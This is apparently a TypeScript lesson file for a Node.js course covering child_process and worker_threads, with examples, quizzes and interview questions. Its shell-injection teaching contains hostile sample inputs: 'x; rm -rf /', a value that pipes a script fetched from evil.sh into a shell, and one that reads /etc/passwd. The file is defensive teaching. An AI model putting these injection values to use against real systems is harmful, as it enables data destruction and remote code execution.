import type { ModuleContent } from '../../../types';
import { bullets, code, dedent, flow, interviewTip, note, section, steps, table, text, warn } from '../helpers';

const content: Partial<ModuleContent> = {
  // ───────────────────────────────────────────────────────────
  'child-process-module': {
    summary: '`node:child_process` runs other programs as separate OS processes: `spawn` streams output, `exec` buffers output through a shell, `execFile` buffers without a shell, and `fork` starts another Node process with an IPC channel.',
    topics: ['child_process', 'spawn', 'exec', 'execFile', 'fork', 'IPC', 'shell injection', 'maxBuffer', 'stdio', 'exit code', 'AbortSignal', 'detached'],
    sections: [
      section('introduction', undefined,
        text('Transcode video with ffmpeg, call git, run a Python model, or isolate risky work in another process — `child_process` lets Node start and talk to other programs.'),
      ),
      section('definition', 'Definition',
        bullets(
          'A **child process** is a separate OS process with its own memory, PID and event loop (if it is Node).',
          'Communication happens over **stdio pipes** (stdin/stdout/stderr) and, for `fork`, an **IPC channel** (`process.send` / `message`).',
          'Each async function returns a `ChildProcess`, which is an EventEmitter (`exit`, `close`, `error`).',
          'Sync variants (`spawnSync`, `execSync`, `execFileSync`) block the event loop — scripts only.',
        ),
      ),
      section('why', 'Why use it',
        bullets(
          'Reuse existing CLI tools instead of reimplementing them.',
          'Run CPU-heavy or crash-prone work in isolation — a crash or memory leak does not take down the server.',
          'Use other languages\' libraries.',
        ),
      ),
      section('internals', 'How a child is started',
        steps(
          'libuv calls `fork` + `exec` (POSIX) or `CreateProcess` (Windows) — the OS creates a new process.',
          'Pipes are created for stdio according to the `stdio` option (`pipe`, `inherit`, `ignore`).',
          '`exec`/`execFile` collect stdout/stderr into memory up to `maxBuffer` (default 1 MiB) and call back at the end.',
          '`spawn` gives you the streams directly — no limit, backpressure applies.',
          '`fork` spawns `process.execPath` (node) with an extra IPC channel using JSON-like serialization.',
        ),
        flow(['Parent (Node)', 'stdin/stdout/stderr pipes + optional IPC', 'Child process (any program / Node)'], { direction: 'horizontal' }),
      ),
      section('visual', 'Comparison and important methods',
        table('spawn vs exec vs execFile vs fork', ['', '`spawn`', '`exec`', '`execFile`', '`fork`'], [
          ['Runs', 'Any command', 'Command string via shell', 'Executable file', 'Node script'],
          ['Shell', 'No (unless `shell: true`)', 'Yes (`/bin/sh`, `cmd.exe`)', 'No (by default)', 'No'],
          ['Output', 'Streams', 'Buffered (callback)', 'Buffered (callback)', 'Streams + IPC messages'],
          ['Size limit', 'None', '`maxBuffer` 1 MiB default', '`maxBuffer` 1 MiB default', 'None'],
          ['Injection risk', 'Low (args array)', '**High** with user input', 'Low (args array)', 'Low'],
          ['Typical use', 'ffmpeg, long-running, big output', 'Quick shell one-liners with pipes/globs', 'Run a binary with args, small output', 'Node worker processes'],
        ]),
        table('child_process — important methods', ['Method', 'What it does', 'Style'], [
          ['`spawn(cmd, args, opts)`', 'Start a process, stream I/O', 'stream / events'],
          ['`exec(cmd, opts, cb)`', 'Run in a shell, buffer output', 'async (callback); promisify-able'],
          ['`execFile(file, args, opts, cb)`', 'Run a binary without shell, buffer output', 'async (callback); promisify-able'],
          ['`fork(modulePath, args, opts)`', 'Node child with IPC (`send`/`message`)', 'events + IPC'],
          ['`spawnSync` / `execSync` / `execFileSync`', 'Blocking versions', 'sync'],
          ['`child.kill(signal)`', 'Send a signal (default SIGTERM)', 'sync'],
          ['option `signal` (AbortSignal)', 'Kill the child when aborted', 'config'],
          ['option `timeout` / `killSignal`', 'Kill after a timeout', 'config'],
          ['option `stdio: \'inherit\'`', 'Share the parent\'s terminal', 'config'],
          ['option `detached` + `child.unref()`', 'Let the child outlive the parent', 'config'],
        ]),
      ),
      section('example', 'Examples',
        code({
          title: 'spawn — stream output of a long-running command',
          code: dedent(`
            import { spawn } from 'node:child_process';

            const child = spawn('ffmpeg', ['-i', 'in.mov', '-f', 'mp4', 'out.mp4']);
            child.stderr.on('data', (d) => process.stdout.write('.'));   // ffmpeg logs progress to stderr
            child.on('error', (err) => console.error('failed to start:', err.code));
            child.on('close', (code) => console.log('\\nffmpeg exited with', code));
          `),
          expectedOutput: '.........\nffmpeg exited with 0',
          explanation: [
            '`error` fires if the binary cannot be started (e.g. `ENOENT` when ffmpeg is not installed).',
            '`close` fires after the process exits **and** its stdio streams close (number of dots varies).',
          ],
        }),
        code({
          title: 'execFile with promisify — safe arguments',
          code: dedent(`
            import { execFile } from 'node:child_process';
            import { promisify } from 'node:util';
            const execFileAsync = promisify(execFile);

            const { stdout } = await execFileAsync('git', ['rev-parse', '--short', 'HEAD']);
            console.log('commit', stdout.trim());
          `),
          expectedOutput: 'commit 3f9c2ab',
          explanation: ['Promisified execFile resolves with `{ stdout, stderr }` and rejects on non-zero exit codes (hash varies).'],
        }),
        code({
          title: 'fork — talk to a Node child over IPC',
          code: dedent(`
            // parent.js
            import { fork } from 'node:child_process';
            const child = fork('./report-worker.js');
            child.send({ month: '2026-10' });
            child.on('message', (msg) => { console.log('report rows:', msg.rows); child.kill(); });

            // report-worker.js
            process.on('message', ({ month }) => {
              const rows = 1250;               // heavy work here
              process.send({ month, rows });
            });
          `),
          expectedOutput: 'report rows: 1250',
          explanation: ['Messages are serialized copies (no shared memory). The child is a full Node process (~30–50 MB of memory).'],
        }),
      ),
      section('real-world', 'Real-world usage',
        bullets(
          'Media processing: thumbnails/transcoding with ffmpeg or ImageMagick via `spawn`.',
          'Running PDF renderers or Python ML scripts from an API worker.',
          'Deploy/ops tooling: `execFile(\'git\', [...])`, `execFile(\'docker\', [...])`.',
          'Always set `timeout` or an `AbortSignal` so stuck children do not pile up.',
        ),
        note('Module 11 covers using processes and worker threads for performance (pools, cluster). Here we focus on the API.'),
      ),
      section('mistakes', 'Common mistakes',
        bullets(
          '**Shell injection**: `exec(\'convert \' + req.query.file + \' out.png\')` — input like `x; rm -rf /` runs as a shell command.',
          'Using `exec` for large output → `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`.',
          'Listening only to `exit` and reading stdout too early — use `close`.',
          'Forgetting the `error` event → crash on `ENOENT`.',
          'Using `execSync` in a request handler.',
          'On Windows, `.bat`/`.cmd` files need `shell: true` — since the April 2024 security releases, `spawn` throws `EINVAL` for them without it.',
        ),
        code({
          title: 'Shell injection: wrong vs right',
          code: dedent(`
            // ✗ user input inside a shell string
            exec('grep ' + req.query.q + ' /var/log/app.log', cb);
            // q = "x /etc/passwd; curl evil.sh | sh"  → arbitrary commands

            // ✓ no shell, arguments passed as an array
            execFile('grep', ['--', req.query.q, '/var/log/app.log'], cb);
          `),
          explanation: ['Without a shell, metacharacters like `;`, `|`, `$()` are plain text. `--` stops grep treating the input as options.'],
        }),
      ),
      section('interview', 'Interview tips',
        interviewTip('Lead with the table: streamed vs buffered, shell vs no shell, IPC for fork. Then volunteer the security point — "never put user input in exec" — before they ask.'),
      ),
      section('practice', 'Practice',
        steps('Write `run(cmd, args, { timeoutMs })` around `spawn` returning `{ code, stdout }` as a promise.', 'Fork a child that computes primes and reports progress messages.'),
      ),
      section('summary', 'Summary',
        bullets(
          '`spawn` = streams; `exec` = shell + buffer; `execFile` = no shell + buffer; `fork` = Node + IPC.',
          'Never pass untrusted input to `exec` or `shell: true`.',
          'Handle `error`, use `close` for completion, set timeouts.',
          'Sync variants block — scripts only.',
        ),
      ),
    ],
    revisionNotes: [
      'spawn: no shell, streaming, no size limit.',
      'exec: shell, buffered, maxBuffer 1 MiB → injection risk.',
      'execFile: no shell, buffered — safe default for small output.',
      'fork: Node child + IPC (send/message), separate memory.',
      '`close` after stdio closes; `exit` may fire earlier.',
      'Windows .bat/.cmd require shell: true (EINVAL otherwise, 2024 security fix).',
    ],
    quiz: [
      {
        kind: 'mcq', difficulty: 'intermediate',
        prompt: 'You need to process 2 GB of output from a command as it is produced. Which function fits?',
        options: ['exec', 'execFile', 'spawn', 'execSync'],
        answer: 2,
        explanation: 'spawn streams stdout with no size limit. exec/execFile buffer everything up to maxBuffer (1 MiB by default) and execSync blocks.',
      },
      {
        kind: 'find-bug', difficulty: 'intermediate',
        prompt: 'What is the security problem?',
        code: "app.get('/ping', (req, res) => {\n  exec('ping -c 1 ' + req.query.host, (err, out) => res.send(out));\n});",
        options: ['ping requires root', 'User input is interpolated into a shell command (command injection)', 'exec cannot return stdout', 'res.send must be awaited'],
        answer: 1,
        explanation: 'host=8.8.8.8;cat /etc/passwd runs a second command. Use execFile(\'ping\', [\'-c\', \'1\', host]) and validate the host.',
      },
      {
        kind: 'mcq', difficulty: 'beginner',
        prompt: 'Which function gives you an IPC channel for sending JS objects between two Node processes?',
        options: ['spawn', 'exec', 'execFile', 'fork'],
        answer: 3,
        explanation: 'fork adds an IPC channel: child.send() / process.on(\'message\'). The others only provide stdio pipes by default.',
      },
    ],
    interview: [
      {
        category: 'nodejs', kind: 'concept', difficulty: 'intermediate', topic: 'child_process',
        question: 'Compare spawn, exec, execFile and fork in the child_process module.',
        shortAnswer: '`spawn` streams I/O without a shell; `exec` runs a string in a shell and buffers output; `execFile` runs a binary with an args array and buffers output without a shell; `fork` starts a Node script with an IPC channel.',
        detailedAnswer: [
          'Buffered functions have `maxBuffer` (1 MiB default).',
          'Shell features (pipes, globs, env expansion) only with exec or `shell: true`.',
          'fork children are full Node processes with separate memory.',
          'All return ChildProcess EventEmitters; promisify works for exec/execFile.',
        ],
        followUp: 'When would you choose fork over worker_threads?',
        trap: 'Saying fork duplicates the parent\'s memory like Unix fork() — it starts a fresh Node process.',
      },
      {
        category: 'nodejs', kind: 'scenario', difficulty: 'advanced', topic: 'child_process',
        question: 'Why is child_process.exec dangerous with user input, and how do you run external commands safely?',
        shortAnswer: 'exec passes a string to a shell, so metacharacters in user input (`;`, `|`, `$()`) execute arbitrary commands. Use execFile/spawn with an arguments array and no shell, plus input validation.',
        detailedAnswer: [
          'Escaping by hand is error-prone across shells (sh vs cmd.exe).',
          'Pass `--` before user-supplied args so they are not parsed as options (argument injection).',
          'Allow-list values where possible (e.g. known formats).',
          'Run with least privilege, timeouts and resource limits.',
          'Windows batch files are a special case; avoid passing user input to them.',
        ],
        followUp: 'What is argument injection, as opposed to command injection?',
        trap: 'Thinking `spawn(cmd, { shell: true })` is safe because it is spawn.',
      },
    ],
  },

  // ───────────────────────────────────────────────────────────
  'worker-threads-module': {
    summary: '`node:worker_threads` runs JavaScript in parallel threads inside one process. Each Worker has its own V8 isolate and event loop; threads communicate via `postMessage` (structured clone or transfer) and can share memory with `SharedArrayBuffer` + `Atomics`.',
    topics: ['worker_threads', 'Worker', 'parentPort', 'workerData', 'isMainThread', 'MessageChannel', 'SharedArrayBuffer', 'Atomics', 'transferList', 'structured clone', 'resourceLimits', 'CPU-bound'],
    sections: [
      section('introduction', undefined,
        text('Resizing images, parsing a huge JSON file or hashing in a tight loop blocks the event loop and freezes every request. Worker threads move that CPU work to other threads.'),
      ),
      section('definition', 'Definition',
        bullets(
          '`new Worker(file, { workerData })` starts a thread running `file`.',
          'Inside the worker: `parentPort` talks to the parent, `workerData` holds the startup data, `isMainThread` is false.',
          'Messages are copied with the **structured clone** algorithm, or **transferred** (zero-copy) for ArrayBuffers/MessagePorts.',
          '`SharedArrayBuffer` gives true shared memory; `Atomics` coordinates access.',
        ),
      ),
      section('why', 'Why workers',
        bullets(
          'The main thread must stay free for I/O — CPU-heavy JS blocks it.',
          'Cheaper than processes: same process, faster startup, can share memory.',
          'Not for I/O: async I/O is already non-blocking — workers add overhead without benefit.',
        ),
      ),
      section('internals', 'What a worker is',
        steps(
          'Node creates an OS thread with a new V8 isolate, its own heap and its own libuv event loop.',
          'Core modules are loaded fresh in the worker; module state is **not** shared with the main thread.',
          'Messages go through a `MessagePort` pair; data is serialized (copied) unless transferred.',
          'The libuv thread pool is **shared** process-wide by all workers.',
          'Start-up cost is tens of milliseconds and several MB — use a pool for repeated tasks.',
        ),
        flow(['Main thread: event loop + V8 isolate', 'MessagePort (structured clone / transfer)', 'Worker thread: own event loop + V8 isolate'], { direction: 'horizontal' }),
      ),
      section('visual', 'Important APIs and comparison',
        table('worker_threads — important APIs', ['API', 'What it does', 'Style'], [
          ['`new Worker(path | URL, { workerData, resourceLimits })`', 'Start a worker thread', 'events'],
          ['`isMainThread`', '`true` in the main thread', 'property'],
          ['`parentPort.postMessage(v)` / `.on(\'message\')`', 'Talk to the parent (inside worker)', 'events'],
          ['`worker.postMessage(v, [transferList])`', 'Send to the worker; transfer ArrayBuffers without copying', 'async (message)'],
          ['`workerData`', 'Cloned data given at start', 'property'],
          ['`worker.on(\'message\' | \'error\' | \'exit\')`', 'Lifecycle events', 'events'],
          ['`worker.terminate()`', 'Stop the worker (returns a promise)', 'async (promise)'],
          ['`new MessageChannel()`', 'Create a port pair for direct worker-to-worker messaging', 'sync'],
          ['`SharedArrayBuffer` + `Atomics.add/wait/notify`', 'Shared memory and synchronization', 'sync'],
          ['`receiveMessageOnPort(port)`', 'Synchronously read one message', 'sync'],
        ]),
        table('Worker threads vs child processes', ['', 'worker_threads', 'child_process / fork'], [
          ['Isolation', 'Same process, separate V8 isolates', 'Separate OS processes'],
          ['Memory', 'Can share (SharedArrayBuffer), transfer buffers', 'Never shared; IPC copies'],
          ['Startup / overhead', 'Lower', 'Higher (full Node process)'],
          ['Crash impact', 'Uncaught error ends the worker; a native crash (e.g. OOM abort) can kill the process', 'Child crash does not affect the parent'],
          ['Runs', 'JavaScript only', 'Any program'],
          ['Best for', 'CPU-heavy JS: parsing, image work, hashing loops', 'External tools, strong isolation'],
        ]),
      ),
      section('example', 'Examples',
        code({
          title: 'Offload a CPU-heavy function (single file)',
          code: dedent(`
            // fib.js
            import { Worker, isMainThread, parentPort, workerData } from 'node:worker_threads';

            function fib(n) { return n < 2 ? n : fib(n - 1) + fib(n - 2); }

            if (isMainThread) {
              const worker = new Worker(new URL(import.meta.url), { workerData: 40 });
              worker.once('message', (result) => console.log('fib(40) =', result));
              worker.once('error', (err) => console.error('worker failed', err));
              console.log('main thread is still free');
            } else {
              parentPort.postMessage(fib(workerData));
            }
          `),
          expectedOutput: 'main thread is still free\nfib(40) = 102334155',
          explanation: [
            'The main thread logs immediately; the worker computes in parallel (~1 s).',
            'The same file runs in both threads; `isMainThread` picks the branch.',
            'Always listen for `error` — otherwise worker exceptions are unhandled in the parent.',
          ],
        }),
        code({
          title: 'Transfer vs copy, and shared memory',
          code: dedent(`
            import { Worker } from 'node:worker_threads';

            const big = new ArrayBuffer(8 * 1024 * 1024);
            const w = new Worker('./resize.js');
            w.postMessage(big, [big]);          // transferred: zero-copy
            console.log(big.byteLength);        // detached in this thread

            const shared = new SharedArrayBuffer(4);
            const counter = new Int32Array(shared);
            w.postMessage(shared);               // both threads see the same memory
            Atomics.add(counter, 0, 1);
            console.log(Atomics.load(counter, 0));
          `),
          expectedOutput: '0\n1',
          explanation: [
            'After transfer, the sender\'s ArrayBuffer is detached (`byteLength` 0).',
            'SharedArrayBuffer is not copied — use `Atomics` for race-free updates (the worker\'s own increments would also show up here).',
          ],
        }),
      ),
      section('real-world', 'Real-world usage',
        bullets(
          'Image/PDF generation, report aggregation, large JSON/CSV parsing inside an API.',
          'Use a **pool** (e.g. piscina, an npm package) rather than one Worker per request.',
          'Set `resourceLimits: { maxOldGenerationSizeMb }` to cap a worker\'s heap.',
          'Keep I/O on the main thread; send only the CPU work to workers.',
        ),
        note('Module 11 goes deeper into worker pools, cluster vs workers and measuring the benefit.'),
      ),
      section('mistakes', 'Common mistakes',
        bullets(
          'Using workers for database or HTTP calls — no gain; async I/O already does not block.',
          'Spawning a new Worker per request — startup cost dominates; pool them.',
          'Sending huge objects by copy — serialize cost can exceed compute; transfer buffers.',
          'Expecting module singletons (DB pool, caches) to be shared with workers — each isolate has its own.',
          'Posting functions or class instances — functions cannot be cloned (`DataCloneError`); class instances lose their prototype.',
        ),
        warn('Workers share the libuv thread pool. Many workers doing fs/crypto async calls compete for the same 4 threads.'),
      ),
      section('interview', 'Interview tips',
        interviewTip('Say "workers are for CPU-bound JavaScript, not I/O", then contrast copy (structured clone), transfer and SharedArrayBuffer — and mention pools.'),
      ),
      section('practice', 'Practice',
        steps('Move a bcrypt-like CPU loop into a worker and measure event-loop delay with `perf_hooks.monitorEventLoopDelay`.', 'Build a 4-worker pool that processes a queue of jobs.'),
      ),
      section('summary', 'Summary',
        bullets(
          'Workers = threads with their own V8 isolate and event loop.',
          'Communicate via postMessage (clone/transfer) or SharedArrayBuffer + Atomics.',
          'For CPU-bound JS only; use a pool.',
          'Child processes give stronger isolation and run any program.',
        ),
      ),
    ],
    revisionNotes: [
      'Worker, isMainThread, parentPort, workerData, MessageChannel.',
      'postMessage = structured clone; transferList = zero-copy, sender detached.',
      'SharedArrayBuffer + Atomics = shared memory.',
      'Each worker: own isolate, heap, event loop; libuv pool shared.',
      'CPU-bound work only; pool workers.',
      'Functions cannot be posted (DataCloneError).',
    ],
    quiz: [
      {
        kind: 'scenario', difficulty: 'intermediate',
        prompt: 'An endpoint that calls three external APIs is slow. A teammate proposes worker threads. What do you say?',
        options: ['Yes — workers speed up all async code', 'No — network I/O is already non-blocking; parallelize with Promise.all instead', 'Yes — but use exec instead', 'No — workers cannot make HTTP requests'],
        answer: 1,
        explanation: 'Workers help CPU-bound JS. Waiting on the network does not block the event loop, so run the calls concurrently. Workers can make HTTP requests; it just does not help here.',
      },
      {
        kind: 'predict-output', difficulty: 'advanced',
        prompt: 'What is logged in the main thread?',
        code: "const buf = new ArrayBuffer(16);\nworker.postMessage(buf, [buf]);\nconsole.log(buf.byteLength);",
        options: ['16', '0', 'undefined', 'TypeError'],
        answer: 1,
        explanation: 'Listing the buffer in the transferList moves ownership to the worker; the sender\'s ArrayBuffer becomes detached with byteLength 0.',
      },
      {
        kind: 'mcq', difficulty: 'intermediate',
        prompt: 'Which statement about worker threads is true?',
        options: ['Workers share the main thread\'s global variables', 'Each worker has its own V8 isolate and event loop', 'Workers are separate OS processes', 'A worker can only run code written with eval'],
        answer: 1,
        explanation: 'Workers are threads in the same process, each with its own isolate, heap and event loop. Globals and module state are not shared.',
      },
    ],
    interview: [
      {
        category: 'nodejs', kind: 'concept', difficulty: 'intermediate', topic: 'worker_threads',
        question: 'When should you use worker threads instead of child processes in Node.js?',
        shortAnswer: 'Use worker threads for CPU-heavy JavaScript that benefits from low overhead and optional shared memory; use child processes to run other programs or when you need full isolation from crashes and memory leaks.',
        detailedAnswer: [
          'Workers: same process, faster startup, SharedArrayBuffer and transfers.',
          'Processes: separate memory, any language, survive each other\'s crashes.',
          'Neither helps with I/O-bound work.',
          'Both should be pooled for repeated tasks.',
        ],
        followUp: 'How does the cluster module differ from both?',
        trap: 'Recommending workers for I/O-heavy endpoints.',
      },
      {
        category: 'nodejs', kind: 'concept', difficulty: 'advanced', topic: 'worker_threads',
        question: 'How does data move between the main thread and a worker: structured clone, transfer, or shared memory — and when do you use each?',
        shortAnswer: 'By default postMessage deep-copies via structured clone. Listing ArrayBuffers in the transferList moves them without copying (the sender loses access). SharedArrayBuffer is truly shared by both threads and needs Atomics for safe coordination.',
        detailedAnswer: [
          'Clone: simple, safe, but costly for large payloads; functions are not cloneable.',
          'Transfer: zero-copy for big binary data (images, file chunks).',
          'Shared: counters, ring buffers, lock-free coordination with `Atomics.wait/notify`.',
          'MessageChannel lets two workers talk directly without the main thread.',
          'Class instances arrive as plain objects (prototype lost).',
        ],
        followUp: 'What race conditions can occur with SharedArrayBuffer and how do Atomics prevent them?',
        trap: 'Thinking postMessage shares the object by reference.',
      },
    ],
  },
};

export default content;
